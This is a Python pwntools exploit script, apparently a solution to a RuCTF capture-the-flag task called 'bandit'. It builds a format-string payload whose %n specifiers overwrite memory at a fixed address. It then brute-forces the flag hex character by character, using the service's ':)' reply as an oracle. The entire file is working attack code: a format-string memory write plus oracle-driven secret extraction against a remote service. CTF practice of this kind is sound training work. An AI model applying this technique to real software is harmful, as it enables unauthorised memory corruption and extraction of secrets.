#!/usr/bin/python

from pwn import *


FLAG_SIZE = 38
SIZE_ADDRESS = 0x601088
ADDRESS_LOCATION = 537


def spawn():
    # io = process('./bandit')
    io = remote('tasks.ruc.tf', 2002)
    return io


def build_payload(flag):
    payload  = flag
    
    payload += 'A' * (FLAG_SIZE - len(flag) + 1)
    payload += ' '

    payload += '%' + str(0x100 - len(payload) + len(flag)) + 'x'
    payload += '%' + str(ADDRESS_LOCATION) + '$n'
    payload += ' '
    
    payload += '%' + str(0x100 - len(flag) - 1) + 'x'
    payload += '%' + str(ADDRESS_LOCATION + 1) + '$n'
    payload += ' '
    
    payload += '%' + str(0x100 - 1) + 'x'
    payload += '%' + str(ADDRESS_LOCATION + 2) + '$n'
    payload += ' '
    
    payload += '%' + str(0x100 - 1) + 'x'
    payload += '%' + str(ADDRESS_LOCATION + 3) + '$n'
    payload += ' '
    
    payload += p64(SIZE_ADDRESS)
    payload += p64(SIZE_ADDRESS + 1)
    payload += p64(SIZE_ADDRESS + 2)
    payload += p64(SIZE_ADDRESS + 3)

    return payload


def check_flag(flag):
    io = spawn()
    io.recvline()
    
    io.sendline(build_payload(flag))
    result = io.recvline()
    io.close()

    return ':)' in result


def main():
    alphabet = '0123456789abcdef'
    length = 32
    
    flag = 'RuCTF_'
    for i in range(length):
        for char in alphabet:
            if check_flag(flag + char):
                flag += char
                print(flag)
                break

    print('Flag is {}'.format(flag))


if __name__ == '__main__':
    main()
